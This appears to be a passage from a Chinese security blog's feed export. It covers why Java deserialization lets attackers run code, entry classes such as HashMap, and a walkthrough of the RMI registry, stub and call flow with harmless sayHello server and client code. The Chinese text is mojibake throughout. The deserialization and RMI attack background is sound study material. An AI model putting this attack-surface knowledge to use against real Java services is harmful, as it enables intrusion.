<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135254681.png" alt="image-20240521135254681"></p>
<p>ååºåˆ—åŒ–ï¼šè¿˜åŸæˆåœ¨åºåˆ—åŒ–å‰çš„ä¸€ä¸ªç±»ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135403252.png" alt="image-20240521135403252"></p>
<h2 id="ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜"><a href="#ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜" class="headerlink" title="ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜"></a>ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜</h2><p>åºåˆ—åŒ–çš„æ•°æ®ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œå¦‚æœæœåŠ¡å™¨æœ‰ååºåˆ—åŒ–çš„æ“ä½œï¼Œé‚£å…¶ä¸­çš„ä»£ç ä¸€å®šä¼šæ‰§è¡Œï¼Œç»™äºˆäº†æ”»å‡»è€…åœ¨æœåŠ¡å™¨æ‰§è¡Œä»£ç çš„èƒ½åŠ›ã€‚</p>
<p>(ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–æ•°æ®ï¼ŒæœåŠ¡å™¨ååºåˆ—åŒ–æ“ä½œä¸€å®šä¼šæ‰§è¡Œ<code>readObject()</code>æ–¹æ³•)</p>
<h2 id="å¯»æ‰¾å…¥å£ç±»"><a href="#å¯»æ‰¾å…¥å£ç±»" class="headerlink" title="å¯»æ‰¾å…¥å£ç±»"></a>å¯»æ‰¾å…¥å£ç±»</h2><p>æ€ä¹ˆç®—æ˜¯ä¸€ä¸ªå¥½çš„å…¥å£ç±»ï¼Ÿå®ç°äº†<code>Serializable</code>æ¥å£,é‡å†™äº†readObjectï¼Œå‚æ•°ç±»å‹å®½æ³›ï¼Œæœ€å¥½JDKè‡ªå¸¦ã€‚</p>
<p>è¿™æ ·æˆ‘ä»¬å¾ˆå®¹æ˜“å°±ä¼šæƒ³åˆ°Mapï¼ŒHashMapå®ç°äº†<strong>Serializable</strong>æ¥å£ï¼Œé‡å†™äº†<code>readObject()</code>æ–¹æ³•ã€‚ï¼ˆåœ¨ç±»é‡Œé¢é‡å†™äº†<code>readObject()</code>æ–¹æ³•ï¼ŒJDKä¼šè‡ªåŠ¨è°ƒç”¨é‡å†™çš„<code>readObject()</code>æ–¹æ³•ï¼Œè€Œä¸è°ƒç”¨åŸç”Ÿçš„<code>readObject()</code>ï¼‰<img src="https://image.sp4rks.xyz/2024/06/image-20240521141902419.png" alt="image-20240521141902419"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521142108326.png" alt="image-20240521142108326"></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVAååºåˆ—åŒ–-RMIæœåŠ¡è°ƒç”¨æµç¨‹ç¯‡</title>
    <url>/2024/12/27/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E4%B8%93%E9%A2%98-%E6%9C%8D%E5%8A%A1%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E7%AF%87/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¹‹å‰å°±å­¦å®ŒRMIäº†ï¼Œæœ¬æ¥æ²¡æ‰“ç®—å†™çš„ï¼Œä½†æ˜¯è¿‡å‡ ä¸ªæœˆæ¥çœ‹åˆæœ‰æ–°çš„æ”¶è·ã€‚é‡æ–°è®°å½•ä¸€ä¸‹å§ã€‚</p>
<ul>
<li>æœ¬ç¯å¢ƒæ˜¯8u65ï¼Œå› ä¸ºåœ¨ 8u121 ä¹‹åï¼Œbind rebind unbind è¿™ä¸‰ä¸ªæ–¹æ³•åªèƒ½å¯¹ localhost è¿›è¡Œæ”»å‡»ã€‚</li>
</ul>
<h1 id="RMIåŸºç¡€"><a href="#RMIåŸºç¡€" class="headerlink" title="RMIåŸºç¡€"></a>RMIåŸºç¡€</h1><p><strong>RMI</strong> å…¨ç§° Remote Method Invocationï¼ˆè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰ï¼Œä¸€ç§ç”¨äºå®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ã€‚å®ƒä½¿å®¢æˆ·æœºä¸Šè¿è¡Œçš„ç¨‹åºå¯ä»¥è°ƒç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ã€‚è¿œç¨‹æ–¹æ³•è°ƒç”¨ç‰¹æ€§ä½¿Javaç¼–ç¨‹äººå‘˜èƒ½å¤Ÿåœ¨ç½‘ç»œç¯å¢ƒä¸­åˆ†å¸ƒæ“ä½œã€‚RMIå…¨éƒ¨çš„å®—æ—¨å°±æ˜¯å°½å¯èƒ½ç®€åŒ–è¿œç¨‹æ¥å£å¯¹è±¡çš„ä½¿ç”¨ã€‚</p>
<p> <strong>JRMP</strong>(Java Remote Message Protocolï¼ŒJava è¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®)ï¼ŒRMI ä¾èµ–çš„é€šä¿¡åè®®ï¼Œè¯¥åè®®ä¸º Java å®šåˆ¶ï¼Œè¦æ±‚æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯éƒ½ä¸º Java ç¼–å†™ã€‚é€šä¿—ç‚¹è§£é‡Šï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªåè®®ï¼Œä¸€ä¸ªåœ¨TCP&#x2F;IPä¹‹ä¸Šçš„çº¿è·¯å±‚åè®®ï¼Œä¸€ä¸ªRMIçš„è¿‡ç¨‹ï¼Œæ˜¯ç”¨åˆ°JRMPè¿™ä¸ªåè®®å»ç»„ç»‡æ•°æ®æ ¼å¼ç„¶åé€šè¿‡TCPè¿›è¡Œä¼ è¾“ï¼Œä»è€Œè¾¾åˆ°RMIï¼Œä¹Ÿå°±æ˜¯è¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚</p>
<p>RMIåŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†ï¼š</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241218134720127.png" alt="image-20241218134720127"></p>
<ul>
<li><strong>Server</strong>ï¼šæä¾›è¿œç¨‹æœåŠ¡çš„ç¨‹åºï¼ŒåŒ…å«äº†å®é™…çš„è¿œç¨‹å¯¹è±¡å®ç°ï¼ŒæœåŠ¡å™¨ç¨‹åºåœ¨å¯åŠ¨æ—¶éœ€è¦åˆ›å»ºè¿œç¨‹å¯¹è±¡å®ä¾‹å¹¶ä½¿ç”¨Naming.rebind()æ–¹æ³•å°†å…¶ä¸æŒ‡å®šçš„åç§°ç»‘å®šåˆ°RMI Registryï¼Œå½“æ¥å—åˆ°æ¥è‡ªå®¢æˆ·ç«¯çš„è¿œç¨‹è°ƒç”¨è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œç›¸åº”çš„æ“ä½œå¹¶è¿”å›ç»“æœã€‚</li>
<li><strong>Client</strong>ï¼šå‘èµ·è¿œç¨‹æ–¹æ³•è°ƒç”¨çš„ç¨‹åºï¼Œå®¢æˆ·ç«¯é€šè¿‡è°ƒç”¨Naming.lookup()æ–¹æ³•ä½¿ç”¨å­—ç¬¦ä¸²å½¢å¼çš„å¯¹è±¡åä»RMI Registryè·å–è¿œç¨‹å¯¹è±¡çš„Stubï¼Œè·å¾—Stubåå®¢æˆ·ç«¯å°±å¯ä»¥åƒè°ƒç”¨æœ¬åœ°å¯¹è±¡ä¸€æ ·è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•</li>
<li>**Registry(æ³¨å†Œä¸­å¿ƒ)**ï¼šè¿è¡Œåœ¨æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªç®€å•çš„åç§°æœåŠ¡ï¼Œç”¨äºç®¡ç†è¿œç¨‹å¯¹è±¡çš„æ³¨å†Œå’ŒæŸ¥æ‰¾ï¼ŒRMI Registryé€šå¸¸åœ¨ç‹¬ç«‹çš„è¿›ç¨‹ä¸­è¿è¡Œ(é»˜è®¤ç«¯å£ä¸º1099)ï¼ŒæœåŠ¡å™¨åœ¨å¯åŠ¨æ—¶ä¼šæ³¨å†Œå…¶æä¾›çš„è¿œç¨‹å¯¹è±¡ä½¿å¾—å®¢æˆ·ç«¯èƒ½å¤Ÿé€šè¿‡åç§°è®¿é—®è¿™äº›å¯¹è±¡</li>
</ul>
<p>å…¶å®å¾ˆå¥½ç†è§£ï¼Œå½“å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹çš„æ–¹æ³•çš„æ—¶å€™å®ƒå¹¶ä¸çŸ¥é“æœåŠ¡ç«¯å¯¹è±¡åœ¨å“ªä¸ªç«¯å£ï¼Œæ‰€ä»¥å¼•å…¥äº†Registryï¼Œå®ƒæœ‰é»˜è®¤çš„ç«¯å£(1099)ï¼Œ</p>
<p>Server ç«¯å‘ Registry æ³¨å†ŒæœåŠ¡ï¼ŒClient ç«¯ä» Registry è·å–è¿œç¨‹å¯¹è±¡çš„ä¸€äº›ä¿¡æ¯ï¼Œå¦‚åœ°å€ã€ç«¯å£ç­‰ï¼Œç„¶åè¿›è¡Œè¿œç¨‹è°ƒç”¨ã€‚</p>
<p>å¤‡æ³¨ï¼šRMIé‡‡ç”¨ä»£ç†æ¥è´Ÿè´£å®¢æˆ·ä¸è¿œç¨‹å¯¹è±¡ä¹‹é—´é€šè¿‡Socketè¿›è¡Œé€šä¿¡çš„ç»†èŠ‚ï¼ŒRMIæ¡†æ¶ä¸ºè¿œç¨‹å¯¹è±¡åˆ†åˆ«ç”Ÿæˆäº†å®¢æˆ·ç«¯ä»£ç†å’ŒæœåŠ¡å™¨ç«¯ä»£ç†ï¼Œä½äºå®¢æˆ·ç«¯çš„ä»£ç†å¿…è¢«ç§°ä¸ºå­˜æ ¹(Stub)ï¼Œä½äºæœåŠ¡å™¨ç«¯çš„ä»£ç†ç±»è¢«ç§°ä¸ºéª¨æ¶(Skeleton)ã€‚</p>
<h1 id="RMIç®€å•å®ç°"><a href="#RMIç®€å•å®ç°" class="headerlink" title="RMIç®€å•å®ç°"></a>RMIç®€å•å®ç°</h1><h2 id="æœåŠ¡ç«¯"><a href="#æœåŠ¡ç«¯" class="headerlink" title="æœåŠ¡ç«¯"></a>æœåŠ¡ç«¯</h2><ol>
<li>å…ˆå®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£ï¼Œéœ€è¦ç»§æ‰¿Remote(å›ºå®šå†™æ³•)ï¼ŒåŒæ—¶æœ‰ä¸ªsayHello()æ¥å£æ–¹æ³•ã€‚æ­¤è¿œç¨‹æ¥å£è¦æ±‚ä½œç”¨åŸŸä¸º publicã€‚</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>å®šä¹‰IRemoteObjçš„å®ç°ç±»ã€‚</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObjimpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteObj</span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteObjimpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">upKeywords</span> <span class="hljs-operator">=</span> keywords.toUpperCase();<br>        System.out.println(upKeywords);<br>        <span class="hljs-keyword">return</span> upKeywords;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç°åœ¨å¯ä»¥è¢«è¿œç¨‹è°ƒç”¨çš„å¯¹è±¡è¢«åˆ›å»ºå¥½äº†ï¼Œæ¥ä¸‹æ¥æ”¹å¦‚ä½•è°ƒç”¨å‘¢ï¼ŸJava RMI è®¾è®¡äº†ä¸€ä¸ª Registry çš„æ€æƒ³ï¼ˆæ³¨æ„ï¼šé€šå¸¸æƒ…å†µä¸‹ï¼ŒRegistry å’ŒServerä¼šéƒ¨ç½²åœ¨åŒä¸€å°æœºå™¨ä¸Šï¼Œä½† RMI ä¹Ÿæ”¯æŒå°†å®ƒä»¬åˆ†å¼€éƒ¨ç½²ã€‚æ‰€ä»¥ä¹Ÿæä¾›äº†ä¸¤ç§è°ƒç”¨æ–¹æ³•ï¼Œå°†ä¼šåœ¨ä¸‹é¢çš„ä»£ç ä½“ç°ï¼‰ï¼Œå¾ˆå¥½ç†è§£ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ³¨å†Œè¡¨æ¥æŸ¥æ‰¾ä¸€ä¸ªè¿œç«¯å¯¹è±¡çš„å¼•ç”¨ï¼Œæ›´é€šä¿—çš„æ¥è®²ï¼Œè¿™ä¸ªå°±æ˜¯ä¸€ä¸ª RMI ç”µè¯æœ¬ï¼Œæˆ‘ä»¬æƒ³åœ¨æŸä¸ªäººé‚£é‡Œè·å–ä¿¡æ¯æ—¶ï¼ˆRemote Method Invocationï¼‰ï¼Œæˆ‘ä»¬åœ¨ç”µè¯æœ¬ä¸Šï¼ˆRegistryï¼‰é€šè¿‡è¿™ä¸ªäººçš„åç§° ï¼ˆNameï¼‰æ¥æ‰¾åˆ°è¿™ä¸ªäººçš„ç”µè¯å·ç ï¼ˆReferenceï¼‰ï¼Œå¹¶é€šè¿‡è¿™ä¸ªå·ç æ‰¾åˆ°è¿™ä¸ªäººï¼ˆRemote Objectï¼‰ã€‚</p>
<p>è¿™ç§ç”µè¯æœ¬çš„æ€æƒ³ï¼Œç”± <code>java.rmi.registry.Registry</code> å’Œ <code>java.rmi.Naming</code> æ¥å®ç°ã€‚è¿™é‡Œåˆ†åˆ«æ¥è¯´è¯´è¿™ä¸¤ä¸ªä¸œè¥¿ã€‚</p>
<p>å…ˆæ¥è¯´è¯´ <code>java.rmi.Naming</code>ï¼Œè¿™æ˜¯ä¸€ä¸ª final ç±»ï¼Œæä¾›äº†åœ¨è¿œç¨‹å¯¹è±¡æ³¨å†Œè¡¨ï¼ˆRegistryï¼‰ä¸­å­˜å‚¨å’Œè·å–è¿œç¨‹å¯¹è±¡å¼•ç”¨çš„æ–¹æ³•ï¼Œè¿™ä¸ªç±»æä¾›çš„æ¯ä¸ªæ–¹æ³•éƒ½æœ‰ä¸€ä¸ª URL æ ¼å¼çš„å‚æ•°ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š<code> //host:port/name</code>ï¼š</p>
<ul>
<li>host è¡¨ç¤ºæ³¨å†Œè¡¨æ‰€åœ¨çš„ä¸»æœº</li>
<li>port è¡¨ç¤ºæ³¨å†Œè¡¨æ¥å—è°ƒç”¨çš„ç«¯å£å·ï¼Œé»˜è®¤ä¸º 1099</li>
<li>name è¡¨ç¤ºä¸€ä¸ªæ³¨å†Œ Remote Object çš„å¼•ç”¨çš„åç§°ï¼Œä¸èƒ½æ˜¯æ³¨å†Œè¡¨ä¸­çš„ä¸€äº›å…³é”®å­—</li>
</ul>
<p>Naming æä¾›äº†æŸ¥è¯¢ï¼ˆlookupï¼‰ã€ç»‘å®šï¼ˆbindï¼‰ã€é‡æ–°ç»‘å®šï¼ˆrebindï¼‰ã€æ¥è§¦ç»‘å®šï¼ˆunbindï¼‰ã€listï¼ˆåˆ—è¡¨ï¼‰ç”¨æ¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œæ“ä½œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒNaming æ˜¯ä¸€ä¸ªç”¨æ¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œæ“ä½œçš„ç±»ã€‚è€Œè¿™äº›æ–¹æ³•çš„å…·ä½“å®ç°ï¼Œå…¶å®æ˜¯è°ƒç”¨ <code>LocateRegistry.getRegistry</code> æ–¹æ³•è·å–äº† Registry æ¥å£çš„å®ç°ç±»ï¼Œå¹¶è°ƒç”¨å…¶ç›¸å…³æ–¹æ³•è¿›è¡Œå®ç°çš„ã€‚</p>
<p>é‚£å°±è¯´åˆ°äº† <code>java.rmi.registry.Registry</code> æ¥å£ï¼Œè¿™ä¸ªæ¥å£åœ¨ RMI ä¸‹æœ‰ä¸¤ä¸ªå®ç°ç±»ï¼Œåˆ†åˆ«æ˜¯ RegistryImpl ä»¥åŠ RegistryImpl_Stubã€‚</p>
<ul>
<li>æˆ‘ä»¬é€šå¸¸ä½¿ç”¨ <code>LocateRegistry.createRegistry()</code> æ–¹æ³•æ¥åˆ›å»ºæ³¨å†Œä¸­å¿ƒï¼š</li>
</ul>
<ol start="3">
<li>æ³¨å†Œè¿œç¨‹å¯¹è±¡ï¼Œå¯åŠ¨äº†ä¸€ä¸ª1099ç«¯å£çš„Registryæ³¨å†ŒæœåŠ¡ï¼Œå¹¶æŠŠIRemoteObjæ¥å£çš„å®ç°RemoteObjimplæš´éœ²å’Œæ³¨å†Œåˆ°Registryæ³¨å†ŒæœåŠ¡ã€‚</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-type">RemoteObjimpl</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjimpl</span>();<br>        <span class="hljs-comment">//å†™æ³•1 é€šè¿‡ç½‘ç»œè¿›è¡Œè¿œç¨‹è°ƒç”¨  ä½¿ç”¨RegistryImpl_Stubè¿œç¨‹è°ƒç”¨</span><br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Naming.bind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, remoteObj);<br>        <span class="hljs-comment">//å†™æ³•2 ç›´æ¥åœ¨æœ¬åœ°è¿›è¡Œç»‘å®šæ“ä½œ  ä½¿ç”¨RegistryImpl.bind æ–¹æ³•</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        registry.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>, remoteObj);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h2><ol>
<li>å…·æœ‰åŒæ ·çš„æ¥å£(ä½†ä¸éœ€è¦å®ç°)ã€‚</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>è¿æ¥åˆ°æ³¨å†Œä¸­å¿ƒï¼Œè·å–è¿œç¨‹å¯¹è±¡ï¼Œè°ƒç”¨è¿œç¨‹æ–¹æ³•ã€‚</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj)registry.lookup(<span class="hljs-string">&quot;remoteObj&quot;</span>);<br>        System.out.println(remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å¯åŠ¨æœåŠ¡ç«¯å†å¯åŠ¨å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬å‘ç°æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½å°†helloå¤§å†™ã€‚</p>
<p>è¿™å…¶ä¸­çš„è¿‡ç¨‹æ˜¯ï¼š</p>
<p>å½“<strong>æœåŠ¡ç«¯</strong>å¯åŠ¨æ—¶ï¼Œå¯åŠ¨ <strong>RMI æ³¨å†Œä¸­å¿ƒ</strong>ï¼Œå°†è¿œç¨‹å¯¹è±¡<code>RemoteObjImpl</code> æ³¨å†Œåˆ°è¯¥æ³¨å†Œä¸­å¿ƒï¼Œå¹¶å°†å…¶ <strong>stub</strong> æš´éœ²ã€‚<strong>stub</strong> åŒ…å«äº†è¿œç¨‹å¯¹è±¡çš„ IP å’Œç«¯å£ä¿¡æ¯ã€‚<strong>å®¢æˆ·ç«¯</strong>é€šè¿‡è¿æ¥ RMI æ³¨å†Œä¸­å¿ƒï¼ŒæŸ¥è¯¢å¹¶è·å¾—è¯¥è¿œç¨‹å¯¹è±¡çš„ <strong>stub</strong>ã€‚<strong>å®¢æˆ·ç«¯</strong>é€šè¿‡è¿™ä¸ª <strong>stub</strong> å‘èµ·è¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚ </p>
<p><strong>å®¢æˆ·ç«¯</strong>é€šè¿‡ <code>lookup</code> æ–¹æ³•è·å–åˆ° <strong>stub</strong> åï¼Œå®é™…ä¸Šè·å¾—äº†æŒ‡å‘è¿œç¨‹å¯¹è±¡çš„ä»£ç†ã€‚è¯¥ä»£ç†åŒ…å«äº†è¿œç¨‹å¯¹è±¡çš„ IP åœ°å€å’Œç«¯å£ä¿¡æ¯ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡ <strong>stub</strong> å‘èµ·è¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚è°ƒç”¨è¿‡ç¨‹ä¸­ä¼šå…ˆç»è¿‡<strong>Skeleton</strong>ï¼Œéšåæ–¹æ³•å‚æ•°é€šè¿‡ <strong>åºåˆ—åŒ–</strong> è½¬æ¢ä¸ºå­—èŠ‚æµå¹¶é€šè¿‡ <strong>JRMP åè®®</strong> å‘é€åˆ°<strong>æœåŠ¡ç«¯</strong>ã€‚<strong>æœåŠ¡ç«¯</strong>æ¥æ”¶åˆ°å­—ç¬¦æµå<strong>ååºåˆ—åŒ–</strong>ï¼Œæ‰§è¡Œæ–¹æ³•å¹¶å°†ç»“æœHELLOçš„<strong>åºåˆ—åŒ–</strong>å­—èŠ‚æµé€šè¿‡ <strong>JRMP åè®®</strong> è¿”å›ï¼Œ<strong>å®¢æˆ·ç«¯</strong>å†é€šè¿‡ <strong>ååºåˆ—åŒ–</strong> è·å¾—è¿”å›çš„æ•°æ®å¹¶è¾“å‡ºç»“æœã€‚</p>
<p>(è¿™é‡Œå€Ÿç”¨su18å¸ˆå‚…çš„å›¾æ¥è¯´æ˜æ•´ä¸ªè¿‡ç¨‹)</p>
<p><img src="https://image.sp4rks.xyz/2024/12/1633059061409.png" alt="1633059061409"></p>
<h1 id="æœåŠ¡æ³¨å†Œ"><a href="#æœåŠ¡æ³¨å†Œ" class="headerlink" title="æœåŠ¡æ³¨å†Œ"></a>æœåŠ¡æ³¨å†Œ</h1><h2 id="åˆ›å»ºè¿œç¨‹å¯¹è±¡"><a href="#åˆ›å»ºè¿œç¨‹å¯¹è±¡" class="headerlink" title="åˆ›å»ºè¿œç¨‹å¯¹è±¡"></a>åˆ›å»ºè¿œç¨‹å¯¹è±¡</h2><p>æˆ‘ä»¬é€šè¿‡<code>RemoteObjimpl remoteObj = new RemoteObjimpl();</code>åˆ›å»ºäº†ä¸€ä¸ªè¿œç¨‹å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ç»§æ‰¿äº† <strong>UnicastRemoteObject</strong>ï¼Œè¿™ä¸ªç±»ç”¨äºä½¿ç”¨ JRMP åè®® export è¿œç¨‹å¯¹è±¡ï¼Œå¹¶è·å–ä¸è¿œç¨‹å¯¹è±¡è¿›è¡Œé€šä¿¡çš„ Stubã€‚æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹å…·ä½“çš„æµç¨‹ã€‚</p>
<p>åœ¨åˆå§‹åŒ–æ—¶ï¼Œè°ƒç”¨å…¶ <code>exportObject</code> æ–¹æ³•æ¥ å‘å¸ƒRemoteObjimplè¿™ä¸ªè¿œç¨‹å¯¹è±¡ã€‚æˆ‘ä»¬æ¥çœ‹è¿™ä¸ªé™æ€å‡½æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ obj å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ <code>new UnicastServerRef(port)</code>ï¼Œå®ƒä¸»è¦å°è£…äº†æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯é€šä¿¡çš„ç»†èŠ‚ã€‚æˆ‘ä»¬è·Ÿè¿› <code>exportObject</code> æ–¹æ³•ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220110758484.png" alt="image-20241220110758484"></p>
<p>ç»§ç»­è·Ÿè¿›æˆ‘ä»¬å‘ç°æœåŠ¡ç«¯åˆ›å»ºè¿œç¨‹æœåŠ¡è¿™ä¸€æ­¥å±…ç„¶å‡ºç°äº† <strong>Stub</strong> çš„åˆ›å»ºï¼Œå…¶å®åŸç†æ˜¯è¿™ä¸ªæ ·å­çš„ï¼ŒRMI å…ˆåœ¨æœåŠ¡ç«¯åˆ›å»ºä¸€ä¸ª Stubï¼Œå†æŠŠ Stub ä¼ åˆ° <strong>RMI Registry</strong> ä¸­ï¼Œæœ€åè®© RMI Client å»è·å– Stubã€‚å¯ä»¥çœ‹ä¸€ä¸‹Stubæ˜¯æ€ä¹ˆäº§ç”Ÿçš„ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220110902678.png" alt="image-20241220110902678"></p>
<p>è¿™å…¶ä¸­ä½¿ç”¨ <code>sun.rmi.server.Util#createProxy()</code> ä¸€çœ‹å°±çŸ¥é“æ˜¯åˆ›å»ºä»£ç†ï¼Œè¿™ä¸ªæ–¹æ³•ä½¿ç”¨ RemoteObjectInvocationHandler æ¥ä¸º <strong>RemoteObjectlmpl</strong> å®ç°çš„ IRemoteObjæ¥å£åˆ›å»ºåŠ¨æ€ä»£ç†ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220111039493.png" alt="image-20241220111039493"></p>
<p>ç„¶ååˆ›å»º <code>sun.rmi.transport.Target</code> å¯¹è±¡ï¼Œå¯ä»¥çœ‹åˆ°Target å¯¹è±¡å°è£…äº†æˆ‘ä»¬è¿œç¨‹æ‰§è¡Œæ–¹æ³•å’Œç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»ï¼ˆStubï¼‰ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220111159951.png" alt="image-20241220111159951"></p>
